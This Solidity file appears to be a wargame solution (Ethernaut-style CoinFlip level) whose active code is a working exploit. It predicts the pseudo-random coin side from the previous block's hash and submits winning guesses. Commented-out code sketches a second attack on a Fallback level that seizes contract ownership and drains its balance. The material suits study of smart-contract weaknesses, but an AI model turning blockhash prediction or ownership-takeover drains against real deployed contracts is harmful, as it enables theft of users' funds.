// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../../contracts/contracts/levels/CoinFlip.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import 'hardhat/console.sol';

contract Exploit {
    using SafeMath for uint256;
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (CoinFlip _target) payable{
        target = _target;
    }

    function guess() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        console.log("blockNumber:%s, side:%s", block.number.sub(1), side);
        target.flip(side);
        console.log("consecutiveWins:%s",target.consecutiveWins());
    }


    //   constructor (Fallback _fallback) payable{
    //     uint256 amount = 0.0001 ether;
    //     target = _fallback;
        // target.contribute{value:amount}(); //call contribute with 0.0001 eth
        // require(amount == target.getContribution(), "contribution not match");

        // //change owner by call receive function
        // (bool sent, ) = address(target).call{value:amount}("");
        // require(sent, "fail to sent");
        // require(address(this) == target.owner(), "unexpected target owner");

        // //withdraw all
        // target.withdraw();

        // //check
        // require(address(target).balance == 0, "some ethers left");
    //}

    // function contribute () public payable{
    //     uint256 amount = 0.0001 ether;
    //     target.contribute{value:amount}(); //call contribute with 0.0001 eth
    //     require(amount == target.getContribution(), "contribution not match");
    // }

    // function send () payable{
    //     (bool sent, ) = address(target).call{value:amount}("");
    //     require(sent, "fail to sent");
    //     require(address(this) == target.owner(), "unexpected target owner");
    // }

    // function withdraw () {
    //     (bool sent, ) = address(target).call{value:amount}("");
    //     require(sent, "fail to sent");
    //     require(address(this) == target.owner(), "unexpected target owner");
    // }


}
